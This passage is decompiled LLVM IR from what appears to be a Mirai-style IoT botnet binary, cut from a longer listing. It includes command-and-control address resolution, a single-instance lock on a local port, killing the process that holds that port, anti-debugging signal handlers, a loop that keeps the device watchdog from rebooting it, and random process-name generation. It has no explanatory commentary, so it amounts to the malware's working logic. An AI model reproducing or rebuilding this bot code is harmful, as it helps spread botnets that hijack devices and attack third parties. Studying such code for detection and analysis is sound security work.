  br i1 %v17_804defc, label %dec_label_pc_804df06, label %dec_label_pc_804df01

dec_label_pc_804df01:                             ; preds = %dec_label_pc_804defa
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_804df03

dec_label_pc_804df03:                             ; preds = %dec_label_pc_804df06, %dec_label_pc_804df01
  %v3_804defc19 = phi i32 [ %v1_804df06, %dec_label_pc_804df06 ], [ 0, %dec_label_pc_804df01 ]
  %v1_804df03 = add i32 %v0_804df0345, 1
  store i32 %v1_804df03, i32* %edx.global-to-local, align 4
  %v1_804def4 = add i32 %v1_804def446, -1
  store i32 %v1_804def4, i32* @ebx, align 4
  %v10_804def5 = icmp eq i32 %v1_804def446, 0
  br i1 %v10_804def5, label %dec_label_pc_804dea7, label %dec_label_pc_804defa

dec_label_pc_804df06:                             ; preds = %dec_label_pc_804defa
  %v1_804df06 = add i32 %v0_804df0643, 1
  store i32 %v1_804df06, i32* @ecx, align 4
  %v12_804df07 = icmp eq i32 %v1_804deea, %v1_804df06
  %v1_804df09 = icmp eq i1 %v12_804df07, false
  br i1 %v1_804df09, label %dec_label_pc_804df03, label %dec_label_pc_804df0b

dec_label_pc_804df0b:                             ; preds = %dec_label_pc_804df06
  %v2_804df0e = inttoptr i32 %v0_804dee5 to i32*
  store i32 62, i32* %v2_804df0e, align 4
  %v2_804df10 = call i32 @table_lock_val(i8 0)
  store i32 %v2_804df10, i32* @eax, align 4
  %v0_804df15 = load i32, i32* @ebp, align 4
  %v1_804df15 = load i32, i32* @esp, align 4
  %v2_804df15 = inttoptr i32 %v1_804df15 to i32*
  store i32 %v0_804df15, i32* %v2_804df15, align 4
  %v1_804df18 = call i32 @__GI___libc_close(i32 0)
  store i32 %v1_804df18, i32* %eax.global-to-local, align 4
  %v0_804df1d = load i32, i32* @esp, align 4
  %v1_804df1d = inttoptr i32 %v0_804df1d to i32*
  %v2_804df1d = load i32, i32* %v1_804df1d, align 4
  store i32 %v2_804df1d, i32* %eax.global-to-local, align 4
  %v3_804df1d = add i32 %v0_804df1d, 4
  %v1_804df1e = inttoptr i32 %v3_804df1d to i32*
  %v2_804df1e = load i32, i32* %v1_804df1e, align 4
  store i32 %v2_804df1e, i32* %edx.global-to-local, align 4
  store i32 9, i32* %v1_804df1e, align 4
  %v1_804df21 = add i32 %v0_804df1d, 40
  %v2_804df21 = inttoptr i32 %v1_804df21 to i32*
  %v3_804df21 = load i32, i32* %v2_804df21, align 4
  store i32 %v3_804df21, i32* %eax.global-to-local, align 4
  store i32 %v3_804df21, i32* %v1_804df1d, align 4
  %v2_804df26 = call i32 @kill(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804df26, i32* %eax.global-to-local, align 4
  %v0_804df2b = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df2e

dec_label_pc_804df2e:                             ; preds = %dec_label_pc_804ddf6, %dec_label_pc_804dfad, %dec_label_pc_804df0b
  %v1_804df2e.in = phi i32 [ %v0_804de8c, %dec_label_pc_804ddf6 ], [ %v0_804dfbf, %dec_label_pc_804dfad ], [ %v0_804df2b, %dec_label_pc_804df0b ]
  %v0_804df2e = phi i32 [ -1, %dec_label_pc_804ddf6 ], [ %v1_804dfba, %dec_label_pc_804dfad ], [ %v2_804df26, %dec_label_pc_804df0b ]
  %v2_804df2e = add i32 %v1_804df2e.in, 12
  %v3_804df2e = inttoptr i32 %v2_804df2e to i32*
  store i32 %v0_804df2e, i32* %v3_804df2e, align 4
  %v0_804df2f = load i32, i32* %eax.global-to-local, align 4
  %v2_804df2f = add i32 %v1_804df2e.in, 8
  %v3_804df2f = inttoptr i32 %v2_804df2f to i32*
  store i32 %v0_804df2f, i32* %v3_804df2f, align 4
  %v1_804df30 = add i32 %v1_804df2e.in, 4
  %v2_804df30 = inttoptr i32 %v1_804df30 to i32*
  store i32 64, i32* %v2_804df30, align 4
  %v1_804df32 = add i32 %v1_804df2e.in, 556
  store i32 %v1_804df32, i32* @eax, align 4
  %v3_804df39 = inttoptr i32 %v1_804df2e.in to i32*
  store i32 %v1_804df32, i32* %v3_804df39, align 4
  %v2_804df3a = call i32 @util_zero(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804df3a, i32* %eax.global-to-local, align 4
  %v0_804df3f = load i32, i32* @esp, align 4
  %v1_804df3f = inttoptr i32 %v0_804df3f to i32*
  store i32 1, i32* %v1_804df3f, align 4
  %v1_804df46 = call i32 @sleep(i32 0)
  store i32 %v1_804df46, i32* %eax.global-to-local, align 4
  %v0_804df4b = load i32, i32* @esp, align 4
  %v1_804df4b = add i32 %v0_804df4b, 40
  %v2_804df4b = inttoptr i32 %v1_804df4b to i32*
  %v3_804df4b = load i32, i32* %v2_804df4b, align 4
  store i32 %v3_804df4b, i32* @edi, align 4
  %v1_804df4f = add i32 %v0_804df4b, 28
  %v2_804df4f = inttoptr i32 %v1_804df4f to i32*
  %v3_804df4f = load i32, i32* %v2_804df4f, align 4
  store i32 %v3_804df4f, i32* @esi, align 4
  %v1_804df53 = add i32 %v0_804df4b, 16
  br label %dec_label_pc_804dd90

dec_label_pc_804df5b:                             ; preds = %dec_label_pc_804dd90
  %v1_804df5e = add i32 %v0_804dd9d, 36
  %v2_804df5e = inttoptr i32 %v1_804df5e to i32*
  %v3_804df5e = load i32, i32* %v2_804df5e, align 4
  store i32 %v3_804df5e, i32* %eax.global-to-local, align 4
  %v3_804df62 = inttoptr i32 %v0_804dd9d to i32*
  store i32 %v3_804df5e, i32* %v3_804df62, align 4
  %v2_804df63 = call i32 @__GI_closedir(i32* null)
  store i32 %v2_804df63, i32* %eax.global-to-local, align 4
  %v0_804df68 = load i32, i32* @esp, align 4
  %v1_804df68 = add i32 %v0_804df68, 16
  br label %dec_label_pc_804dd57

dec_label_pc_804df70:                             ; preds = %dec_label_pc_804ddd5
  %v1_804df70 = add i32 %v0_804dde1, 40
  %v2_804df70 = inttoptr i32 %v1_804df70 to i32*
  %v3_804df70 = load i32, i32* %v2_804df70, align 4
  %v4_804df70 = add i32 %v3_804df70, -400
  %v6_804df70 = sub i32 399, %v3_804df70
  %v7_804df70 = and i32 %v6_804df70, %v3_804df70
  %v8_804df70 = icmp slt i32 %v7_804df70, 0
  %v9_804df70 = icmp eq i32 %v4_804df70, 0
  %v10_804df70 = icmp slt i32 %v4_804df70, 0
  %v3_804df78 = icmp ne i1 %v10_804df70, %v8_804df70
  %v4_804df78 = or i1 %v9_804df70, %v3_804df78
  br i1 %v4_804df78, label %dec_label_pc_804dd90, label %dec_label_pc_804df7e

dec_label_pc_804df7e:                             ; preds = %dec_label_pc_804df70
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804df83 = add i32 %v0_804dde1, 32
  %v2_804df83 = inttoptr i32 %v1_804df83 to i32*
  %v3_804df83 = load i32, i32* %v2_804df83, align 4
  %v10_804df83 = udiv i32 %v3_804df83, 2
  store i32 %v10_804df83, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804df91 = load i32, i32* %v2_804df83, align 4
  %v15_804df91 = icmp eq i32 %v3_804df91, 0
  %v1_804df95 = icmp eq i1 %v15_804df91, false
  br i1 %v1_804df95, label %dec_label_pc_804dd90, label %dec_label_pc_804df9b

dec_label_pc_804df9b:                             ; preds = %dec_label_pc_804df7e
  %v2_804df9e = inttoptr i32 %v0_804dde1 to i32*
  store i32 1, i32* %v2_804df9e, align 4
  %v1_804dfa0 = call i32 @sleep(i32 0)
  store i32 %v1_804dfa0, i32* %eax.global-to-local, align 4
  %v0_804dfa5 = load i32, i32* @esp, align 4
  %v1_804dfa5 = add i32 %v0_804dfa5, 16
  br label %dec_label_pc_804dd90

dec_label_pc_804dfad:                             ; preds = %dec_label_pc_804dea7
  %v2_804dfb0 = inttoptr i32 %v0_804deb8 to i32*
  store i32 62, i32* %v2_804dfb0, align 4
  %v2_804dfb2 = call i32 @table_lock_val(i8 0)
  store i32 %v2_804dfb2, i32* @eax, align 4
  %v0_804dfb7 = load i32, i32* @ebp, align 4
  %v1_804dfb7 = load i32, i32* @esp, align 4
  %v2_804dfb7 = inttoptr i32 %v1_804dfb7 to i32*
  store i32 %v0_804dfb7, i32* %v2_804dfb7, align 4
  %v1_804dfba = call i32 @__GI___libc_close(i32 0)
  store i32 %v1_804dfba, i32* %eax.global-to-local, align 4
  %v0_804dfbf = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df2e

dec_label_pc_804dfc7:                             ; preds = %dec_label_pc_804dcf2
  %v3_804dfd8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804dfd8, i32* %eax.global-to-local, align 4
  store i32 %v3_804dfd8, i32* @ebx, align 4
  %v10_804dfe2 = icmp eq i32 %v3_804dfd8, -1
  br i1 %v10_804dfe2, label %dec_label_pc_804dd1f, label %dec_label_pc_804dfeb

dec_label_pc_804dfeb:                             ; preds = %dec_label_pc_804dfc7
  %v2_804dfeb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dfeb, i32* %eax.global-to-local, align 4
  %v0_804dff2 = load i32, i32* @ecx, align 4
  %v4_804dff7 = call i32 @bind(i32 %v3_804dfd8, i32 %v2_804dfeb, i32 16, i32 %v0_804dff2)
  store i32 %v3_804dfd8, i32* %eax.global-to-local, align 4
  store i32 %v2_804dfeb, i32* %edx.global-to-local, align 4
  %v0_804e000 = load i32, i32* @ebx, align 4
  %v2_804e001 = call i32 @listen(i32 %v0_804e000, i32 1)
  store i32 %v2_804e001, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dd1f

; uselistorder directives
  uselistorder i32 %v3_804dfd8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_804dfba, { 1, 0 }
  uselistorder i32 %v4_804df70, { 1, 0 }
  uselistorder i32 %v1_804df06, { 0, 2, 1 }
  uselistorder i32 %v1_804def4, { 1, 0 }
  uselistorder i32 %v1_804df03, { 1, 0 }
  uselistorder i32 %v6_804defa, { 1, 0 }
  uselistorder i32 %v0_804df0345, { 1, 0 }
  uselistorder i32 %v1_804dee5, { 2, 1, 0 }
  uselistorder i32 %v3_804dee0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804deb8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804deb3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804dea7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804de37, { 1, 0, 2 }
  uselistorder i32 %v1_804dde4, { 1, 0 }
  uselistorder i32 %v1_804dde1, { 2, 1, 0 }
  uselistorder i32 %v0_804dde1, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804dddf, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804ddd1, { 1, 0 }
  uselistorder i32 %v1_804ddad, { 1, 0 }
  uselistorder i32 %v0_804dd9d, { 1, 0, 5, 2, 3, 4, 6 }
  uselistorder i32 %v0_804dd98, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804dd90, { 1, 0 }
  uselistorder i32 %v1_804dd35, { 0, 2, 1 }
  uselistorder i32 %v0_804dce4, { 3, 2, 1, 0 }
  uselistorder i32 %v12_804dcd8, { 2, 0, 1 }
  uselistorder i32 %v1_804dcd3, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 42, 34, 35, 36, 37, 38, 39, 40, 41, 43, 44, 45, 46, 47, 48, 49, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 556, { 0, 1, 3, 2 }
  uselistorder i32 (i8*, i32)* @util_atoi, { 1, 2, 5, 3, 4, 0 }
  uselistorder i32 ()* @__GI_readdir, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804df2e, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804defa, { 1, 0 }
  uselistorder label %dec_label_pc_804dea7, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804dd90, { 4, 1, 2, 5, 3, 0, 6 }
  uselistorder label %dec_label_pc_804dd1f, { 2, 1, 0 }
}

define i32 @anti_gdb_entry() local_unnamed_addr {
entry:
  store i32 134537248, i32* @global_var_8057b9c.31, align 4
  %v0_804e01a = load i32, i32* @eax, align 4
  ret i32 %v0_804e01a
}

define i32 @resolve_cnc_addr() local_unnamed_addr {
entry:
  %v2_804e025 = call i32 @table_unlock_val(i8 2)
  store i32 610240953, i32* @global_var_805a864.32, align 4
  %v3_804e03a = call i32 @table_retrieve_val(i32 2, i32* null)
  %v4_804e03a = inttoptr i32 %v3_804e03a to i16*
  %v3_804e03f = load i16, i16* %v4_804e03a, align 2
  store i16 %v3_804e03f, i16* bitcast (i32* @global_var_805a862.33 to i16*), align 4
  %v2_804e04f = call i32 @table_lock_val(i8 2)
  ret i32 %v2_804e04f
}

define i32 @ensure_single_instance() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e060 = load i32, i32* @esi, align 4
  %v0_804e061 = load i32, i32* @ebx, align 4
  store i32 %v0_804e061, i32* %stack_var_-8, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e073 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804e073, i32* @global_var_8057b94.34, align 4
  %v10_804e082 = icmp eq i32 %v3_804e073, -1
  br i1 %v10_804e082, label %dec_label_pc_804e127, label %dec_label_pc_804e08b

dec_label_pc_804e08b:                             ; preds = %entry
  %v2_804e090 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e09a = call i32 @__GI_setsockopt(i32 %v3_804e073, i32 1, i32 2, i32 %v2_804e090, i32 4)
  %v0_804e0a2 = load i32, i32* @global_var_8057b94.34, align 4
  %v3_804e0ad = call i32 @__libc_fcntl(i32 %v0_804e0a2, i32 3, i32 0)
  %v12_804e0b5 = or i32 %v3_804e0ad, 2048
  %v0_804e0b9 = load i32, i32* @global_var_8057b94.34, align 4
  %v3_804e0c1 = call i32 @__libc_fcntl(i32 %v0_804e0b9, i32 4, i32 %v12_804e0b5)
  %v0_804e0ce = load i8, i8* @global_var_8057ba0.35, align 32
  %v1_804e0ce = icmp eq i8 %v0_804e0ce, 0
  %v1_804e0d5 = icmp eq i1 %v1_804e0ce, false
  br i1 %v1_804e0d5, label %dec_label_pc_804e0dc, label %dec_label_pc_804e0d7

dec_label_pc_804e0d7:                             ; preds = %dec_label_pc_804e08b
  %v0_804e0d7 = load i32, i32* @global_var_805a858.27, align 8
  br label %dec_label_pc_804e0dc

dec_label_pc_804e0dc:                             ; preds = %dec_label_pc_804e08b, %dec_label_pc_804e0d7
  %v0_804e0dc = phi i32 [ 16777343, %dec_label_pc_804e08b ], [ %v0_804e0d7, %dec_label_pc_804e0d7 ]
  %v3_804e0e7 = call i32 @__GI___errno_location(i32 -14585, i32 %v0_804e0dc)
  %v2_804e0ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e0ec, i32* @esi, align 4
  store i32 2, i32* %stack_var_-28, align 4
  store i32 %v3_804e0e7, i32* @ebx, align 4
  %v1_804e0f9 = inttoptr i32 %v3_804e0e7 to i32*
  store i32 0, i32* %v1_804e0f9, align 4
  %v0_804e100 = load i32, i32* @global_var_8057b94.34, align 4
  %v4_804e109 = call i32 @bind(i32 %v0_804e100, i32 %v2_804e0ec, i32 16, i32 %v3_804e0e7)
  %v8_804e111 = icmp eq i32 %v4_804e109, -1
  br i1 %v8_804e111, label %dec_label_pc_804e130, label %dec_label_pc_804e114

dec_label_pc_804e114:                             ; preds = %dec_label_pc_804e0dc
  %v0_804e114 = load i32, i32* @global_var_8057b94.34, align 4
  %v2_804e11f = call i32 @listen(i32 %v0_804e114, i32 1)
  %v2_804e12a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804e127

dec_label_pc_804e127:                             ; preds = %entry, %dec_label_pc_804e114
  %v2_804e12a = phi i32 [ %v0_804e061, %entry ], [ %v2_804e12a.pre, %dec_label_pc_804e114 ]
  %v0_804e12c = phi i32 [ -1, %entry ], [ %v2_804e11f, %dec_label_pc_804e114 ]
  store i32 %v2_804e12a, i32* @ebx, align 4
  store i32 %v0_804e060, i32* @esi, align 4
  ret i32 %v0_804e12c

dec_label_pc_804e130:                             ; preds = %dec_label_pc_804e0dc
  %v0_804e130 = load i32, i32* @ebx, align 4
  %v1_804e130 = inttoptr i32 %v0_804e130 to i32*
  %v2_804e130 = load i32, i32* %v1_804e130, align 4
  %v11_804e130 = icmp eq i32 %v2_804e130, 99
  br i1 %v11_804e130, label %dec_label_pc_804e18d, label %dec_label_pc_804e135

dec_label_pc_804e135:                             ; preds = %dec_label_pc_804e130, %dec_label_pc_804e18d
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e14c = load i32, i32* @global_var_8057b94.34, align 4
  %v3_804e155 = call i32 @__libc_connect(i32 %v0_804e14c, i32 %v2_804e0ec, i32 16)
  %v1_804e161 = call i32 @sleep(i32 5)
  store i32 5, i32* @eax, align 4
  %v0_804e167 = load i32, i32* @global_var_8057b94.34, align 4
  store i32 %v0_804e167, i32* @esi, align 4
  %v1_804e16e = call i32 @__GI___libc_close(i32 %v0_804e167)
  %v1_804e17a = call i32 @killer_kill_by_port(i32 50951)
  %v0_804e17f = call i32 @ensure_single_instance()
  %v2_804e18a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e18a, i32* @ebx, align 4
  store i32 %v0_804e060, i32* @esi, align 4
  ret i32 %v0_804e17f

dec_label_pc_804e18d:                             ; preds = %dec_label_pc_804e130
  store i8 0, i8* @global_var_8057ba0.35, align 32
  br label %dec_label_pc_804e135

; uselistorder directives
  uselistorder i32 %v3_804e073, { 1, 0, 2 }
  uselistorder i32 %v0_804e060, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bind, { 1, 0, 2 }
  uselistorder i8* @global_var_8057ba0.35, { 1, 0 }
  uselistorder label %dec_label_pc_804e135, { 1, 0 }
  uselistorder label %dec_label_pc_804e127, { 1, 0 }
  uselistorder label %dec_label_pc_804e0dc, { 1, 0 }
}

define i32 @watchdog_maintain() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804e1a0 = load i32, i32* @ebx, align 4
  %v1_804e1a4 = call i32 @__libc_fork(i32 %v0_804e1a0)
  store i32 %v1_804e1a4, i32* @global_var_8057d2c.36, align 4
  %tmp10 = icmp slt i32 %v1_804e1a4, 1
  br i1 %tmp10, label %dec_label_pc_804e1b7, label %dec_label_pc_804e1b2

dec_label_pc_804e1b2:                             ; preds = %dec_label_pc_804e1b7, %entry
  %v0_804e1b6 = phi i32 [ 0, %dec_label_pc_804e1b7 ], [ %v1_804e1a4, %entry ]
  store i32 %v0_804e1a0, i32* @ebx, align 4
  ret i32 %v0_804e1b6

dec_label_pc_804e1b7:                             ; preds = %entry
  %v8_804e1b7 = icmp eq i32 %v1_804e1a4, -1
  br i1 %v8_804e1b7, label %dec_label_pc_804e1b2, label %dec_label_pc_804e1ba

dec_label_pc_804e1ba:                             ; preds = %dec_label_pc_804e1b7
  store i32 1, i32* %stack_var_-8, align 4
  %v2_804e1c7 = call i32 @table_unlock_val(i8 59)
  %v2_804e1d3 = call i32 @table_unlock_val(i8 60)
  %v3_804e1de = call i32 @table_retrieve_val(i32 59, i32* null)
  store i32 %v3_804e1de, i32* @eax, align 4
  %v2_804e1e8 = call i32 @__libc_open(i32 %v3_804e1de, i32 2)
  store i32 %v2_804e1e8, i32* @ebx, align 4
  %v10_804e1f2 = icmp eq i32 %v2_804e1e8, -1
  br i1 %v10_804e1f2, label %dec_label_pc_804e22f, label %dec_label_pc_804e1f7

dec_label_pc_804e1f7:                             ; preds = %dec_label_pc_804e1ba, %dec_label_pc_804e22f
  %v0_804e202 = phi i32 [ %v2_804e23f, %dec_label_pc_804e22f ], [ %v2_804e1e8, %dec_label_pc_804e1ba ]
  %v2_804e1f8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804e203 = call i32 @ioctl(i32 %v0_804e202, i32 -2147199228, i32 %v2_804e1f8)
  br label %dec_label_pc_804e210

dec_label_pc_804e210:                             ; preds = %dec_label_pc_804e210, %dec_label_pc_804e1f7
  %v0_804e218 = load i32, i32* @ebx, align 4
  %v3_804e219 = call i32 @ioctl(i32 %v0_804e218, i32 -2147199227, i32 0)
  %v1_804e225 = call i32 @sleep(i32 10)
  br label %dec_label_pc_804e210

dec_label_pc_804e22f:                             ; preds = %dec_label_pc_804e1ba
  %v3_804e235 = call i32 @table_retrieve_val(i32 60, i32* null)
  store i32 %v3_804e235, i32* @eax, align 4
  %v2_804e23f = call i32 @__libc_open(i32 %v3_804e235, i32 2)
  store i32 %v2_804e23f, i32* @ebx, align 4
  %v10_804e249 = icmp eq i32 %v2_804e23f, -1
  %v1_804e24c = icmp eq i1 %v10_804e249, false
  br i1 %v1_804e24c, label %dec_label_pc_804e1f7, label %dec_label_pc_804e24e

dec_label_pc_804e24e:                             ; preds = %dec_label_pc_804e22f
  %v2_804e253 = call i32 @table_lock_val(i8 59)
  %v2_804e25f = call i32 @table_lock_val(i8 60)
  %v1_804e26b = call i32 @__GI_exit(i32 0)
  ret i32 %v1_804e26b

; uselistorder directives
  uselistorder i32 %v2_804e23f, { 0, 2, 1 }
  uselistorder i32 %v2_804e1e8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804e1f7, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1448 = alloca i32, align 4
  %stack_var_-1456 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-1452 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i8**, align 4
  store i8** %argv, i8*** %stack_var_4, align 4
  %v2_804e270 = ptrtoint i8*** %stack_var_4 to i32
  store i32 %v2_804e270, i32* %ecx.global-to-local, align 4
  %v0_804e27a = load i32, i32* @ebp, align 4
  %v0_804e27b = load i32, i32* @edi, align 4
  store i32 %v2_804e270, i32* %stack_var_-24, align 4
  %v3_804e285 = ptrtoint i8** %argv to i32
  store i32 %v3_804e285, i32* @edi, align 4
  %v2_804e28a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e28a, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 %v2_804e28a, i32* %stack_var_-1456, align 4
  %v2_804e29d = call i32 @sigemptyset(i32* nonnull %stack_var_-48)
  %v2_804e2a2 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e2a2, i32* %eax.global-to-local, align 4
  %v2_804e2a3 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e2a3, i32* %edx.global-to-local, align 4
  store i32 2, i32* %stack_var_-1452, align 4
  store i32 %v2_804e28a, i32* %stack_var_-1456, align 4
  %v2_804e2a7 = call i32 @__GI_sigaddset(i32 %v2_804e28a, i32 2)
  store i32 %v2_804e2a7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-1448, align 4
  store i32 %v2_804e28a, i32* %stack_var_-1452, align 4
  store i32 0, i32* %stack_var_-1456, align 4
  %v3_804e2b4 = bitcast i32* %stack_var_-48 to %_TYPEDEF_sigset_t*
  %v4_804e2b4 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_804e2b4, i32 0)
  %v2_804e2b9 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e2b9, i32* @ebp, align 4
  %v2_804e2ba = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e2ba, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-1452, align 4
  store i32 17, i32* %stack_var_-1456, align 4
  %v2_804e2bf = call i32 @bsd_signal(i32 17, i32 1)
  store i32 %v2_804e2bf, i32* %eax.global-to-local, align 4
  %v2_804e2c4 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e2c4, i32* %ecx.global-to-local, align 4
  %v2_804e2c5 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e2c5, i32* @ebx, align 4
  store i32 134537232, i32* %stack_var_-1452, align 4
  store i32 5, i32* %stack_var_-1456, align 4
  %v2_804e2cd = call i32 @bsd_signal(i32 5, i32 134537232)
  store i32 %v2_804e2cd, i32* %eax.global-to-local, align 4
  %v0_804e2d2 = call i32 @util_local_addr()
  store i32 %v0_804e2d2, i32* %eax.global-to-local, align 4
  store i16 2, i16* bitcast (i32* @global_var_805a860.37 to i16*), align 32
  store i32 %v0_804e2d2, i32* @global_var_805a858.27, align 8
  store i32 1494907824, i32* @global_var_805a864.32, align 4
  store i16 5888, i16* bitcast (i32* @global_var_805a862.33 to i16*), align 4
  %v0_804e2f8 = call i32 @table_init()
  store i32 %v0_804e2f8, i32* %eax.global-to-local, align 4
  store i32 134537248, i32* @global_var_8057b9c.31, align 4
  %v0_804e307 = call i32 @ensure_single_instance()
  store i32 %v0_804e307, i32* %eax.global-to-local, align 4
  %v0_804e30c = call i32 @rand_init()
  %v2_804e312 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e312, i32* %edx.global-to-local, align 4
  store i32 32, i32* %stack_var_-1452, align 4
  %v2_804e315 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804e315, i32* @eax, align 4
  store i32 %v2_804e315, i32* %stack_var_-1456, align 4
  %v2_804e31d = call i32 @util_zero(i32 %v2_804e315, i32 32)
  store i32 %v2_804e31d, i32* %eax.global-to-local, align 4
  %v0_804e325 = load i32, i32* @edi, align 4
  %v9_804e325 = icmp eq i32 %v0_804e325, 2
  br i1 %v9_804e325, label %dec_label_pc_804e474, label %dec_label_pc_804e32e

dec_label_pc_804e32e:                             ; preds = %dec_label_pc_804e474, %entry, %dec_label_pc_804e48c
  %stack_var_-1444.0 = phi i32 [ %tmp23, %dec_label_pc_804e474 ], [ %v2_804e47b, %dec_label_pc_804e48c ], [ %tmp23, %entry ]
  %v0_804e32e = load i32, i32* %stack_var_-1456, align 4
  %v1_804e32e = call i32 @rand_next(i32 %v0_804e32e)
  store i32 %v1_804e32e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e32e, i32* %ebp.global-to-local, align 4
  %v0_804e338 = load i32, i32* @esi, align 4
  %v1_804e338 = inttoptr i32 %v0_804e338 to i32*
  %v2_804e338 = load i32, i32* %v1_804e338, align 4
  store i32 %v2_804e338, i32* %eax.global-to-local, align 4
  store i32 %v2_804e338, i32* %stack_var_-1456, align 4
  %v1_804e33b = inttoptr i32 %v2_804e338 to i8*
  %v2_804e33b = call i32 @util_strlen(i8* %v1_804e33b)
  store i32 %v2_804e33b, i32* @edi, align 4
  %v2_804e342 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e342, i32* %eax.global-to-local, align 4
  %v0_804e343 = load i32, i32* @esi, align 4
  %v1_804e343 = inttoptr i32 %v0_804e343 to i32*
  %v2_804e343 = load i32, i32* %v1_804e343, align 4
  store i32 %v2_804e343, i32* %eax.global-to-local, align 4
  store i32 %v2_804e343, i32* %stack_var_-1456, align 4
  %v1_804e346 = inttoptr i32 %v2_804e343 to i8*
  %v2_804e346 = call i32 @util_strlen(i8* %v1_804e346)
  %v1_804e352 = load i32, i32* @edi, align 4
  %v2_804e352 = sub i32 20, %v1_804e352
  %v0_804e354 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v2_804e352, i32* %ecx.global-to-local, align 4
  %tmp36 = urem i32 %v0_804e354, %v2_804e352
  store i32 %tmp36, i32* %edx.global-to-local, align 4
  %v2_804e35c = add i32 %tmp36, %v2_804e346
  store i32 %v2_804e35c, i32* @ebx, align 4
  %v2_804e366 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e366, i32* @ebp, align 4
  store i32 %v2_804e35c, i32* %stack_var_-1452, align 4
  %v2_804e369 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_804e369, i32* %eax.global-to-local, align 4
  store i32 %v2_804e369, i32* %stack_var_-1456, align 4
  %v2_804e371 = bitcast i32* %stack_var_-104 to i8*
  %v3_804e371 = call i32 @rand_alphastr(i8* %v2_804e371, i32 %v2_804e35c)
  store i32 %v3_804e371, i32* @eax, align 4
  %v0_804e376 = load i32, i32* @esp, align 4
  %v1_804e376 = load i32, i32* @ebx, align 4
  %v2_804e376 = add i32 %v0_804e376, 1352
  %v3_804e376 = add i32 %v2_804e376, %v1_804e376
  %v4_804e376 = inttoptr i32 %v3_804e376 to i8*
  store i8 0, i8* %v4_804e376, align 1
  %v2_804e37e = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e37e, i32* @ebx, align 4
  %v2_804e37f = load i32, i32* %stack_var_-1452, align 4
